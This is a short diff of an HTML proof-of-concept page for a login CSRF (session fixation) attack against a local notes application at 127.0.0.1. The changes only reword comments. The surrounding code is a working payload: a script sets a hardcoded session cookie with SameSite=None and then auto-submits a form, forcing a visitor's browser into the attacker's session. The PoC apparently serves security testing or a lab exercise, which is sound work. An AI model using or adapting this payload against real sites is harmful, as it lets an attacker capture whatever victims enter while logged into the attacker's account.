@@ -1,4 +1,4 @@
-<!-- CSRF PoC to send a custom session token -->
+<!-- Login CSRF PoC to force the user to use your session -->
 <html>
   <body>
     <form action="http://127.0.0.1/notes" method="GET">
@@ -6,7 +6,7 @@
     </form>
 
     <script>
-      // Manually set the session cookie with SameSite=None and Secure attributes
+      // Manually set your session cookie with SameSite=None and Secure attributes
       document.cookie = "session=ekgI9%2BTr8PfMGByyddoYmTPzVM2loiugQ%2B9SKIREuCyLkDjVT8Ol1wpP%2FIetv5DiAgf%2B0m4dPVj4YBJx9ZpCsNRNVQ%3D%3D%3B%2Fu2F9TtyXl47ywpHBu4IVpTg2Oo2TO1s; path=/notes; domain=127.0.0.1; SameSite=None; Secure";
 
       // Automatically submit the form to trigger the CSRF request
